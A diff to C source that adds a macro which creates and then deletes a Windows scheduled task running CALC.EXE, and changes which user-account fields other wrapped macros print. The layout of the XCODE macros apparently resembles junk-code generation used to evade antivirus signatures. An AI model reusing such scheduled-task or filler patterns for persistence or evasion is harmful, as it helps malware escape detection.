@@ -69,6 +69,13 @@ LPUSER_INFO_10 pBuf10 = NULL;
 LPUSER_INFO_11 pBuf11 = NULL;
 LPUSER_INFO_20 pBuf20 = NULL;
 LPUSER_INFO_23 pBuf23 = NULL;
+ITaskScheduler * pITaskScheduler = 0;
+ITask * pITask = 0;
+ITaskTrigger * pITaskTrigger = 0;
+HRESULT hr;
+LPWSTR ppwszComputer;
+WORD iNewTrigger;
+TASK_TRIGGER trigger;
 
 #define XCODE1 __try{\
 		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
@@ -441,11 +448,11 @@ do {\
 					break;\
 				case 2:\
 					pBuf2 = (LPUSER_INFO_2) pBuf;\
-					wprintf(L"\tUser account name: %s\n", pBuf2->usri2_name);\
+					wprintf(L"\tPrivilege level: %d\n", pBuf2->usri2_priv);\
 					break;\
 				case 4:\
 					pBuf4 = (LPUSER_INFO_4) pBuf;\
-					wprintf(L"\tUser account name: %s\n", pBuf4->usri4_name);\
+					wprintf(L"\tHome directory: %s\n", pBuf4->usri4_home_dir);\
 					break;\
 				case 10:\
 					pBuf10 = (LPUSER_INFO_10) pBuf;\
@@ -454,15 +461,15 @@ do {\
 					break;\
 				case 11:\
 					pBuf11 = (LPUSER_INFO_11) pBuf;\
-					wprintf(L"\tUser account name: %s\n", pBuf11->usri11_name);\
+					wprintf(L"\tAuth flags: %x\n", pBuf11->usri11_auth_flags);\
 					break;\
 				case 20:\
 					pBuf20 = (LPUSER_INFO_20) pBuf;\
-					wprintf(L"\tUser account name: %s\n", pBuf20->usri20_name);\
+					wprintf(L"\tFlags (in hex): %x\n", pBuf20->usri20_flags);\
 					break;\
 				case 23:\
 					pBuf23 = (LPUSER_INFO_23) pBuf;\
-					wprintf(L"\tUser account name: %s\n", pBuf23->usri23_name);\
+					wprintf(L"\tComment: %s\n", pBuf23->usri23_comment);\
 					break;\
 				default:\
 					break;\
@@ -500,6 +507,33 @@ do {\
 		__except(EXCEPTION_EXECUTE_HANDLER){\
 		Sleep(13);\
 	}
+
+#define XCODE14 __try{\
+    CoInitialize( 0 );\
+        hr = CoCreateInstance(  CLSID_CTaskScheduler,0,CLSCTX_SERVER,IID_ITaskScheduler,(LPVOID *)&pITaskScheduler );\
+        pITaskScheduler->GetTargetComputer( &ppwszComputer );\
+        _tprintf( _T("Target computer: %s\n"), ppwszComputer );\
+        CoTaskMemFree( ppwszComputer );\
+        hr = pITaskScheduler->NewWorkItem(L"MyHappyWorkItem",CLSID_CTask,IID_ITask,(LPUNKNOWN *)&pITask );\
+        hr = pITask->SetApplicationName( L"CALC.EXE" ); \
+        hr = pITask->CreateTrigger( &iNewTrigger, &pITaskTrigger );\
+        pITaskTrigger->GetTrigger( &trigger );\
+        trigger.wStartMinute++;\
+        pITaskTrigger->SetTrigger( &trigger );\
+        pITaskScheduler->Delete( L"MyHappyWorkItem" );\
+    }\
+    __finally\
+    {\
+        if ( pITaskTrigger )\
+            pITaskTrigger->Release();\
+        if ( pITask )\
+            pITask->Release();\
+        if ( pITaskScheduler )\
+            pITaskScheduler->Release();\
+        CoUninitialize();\
+		Sleep(13);\
+    }
+
 #ifdef FLOWERX
 #include "xrand.h"
 #else
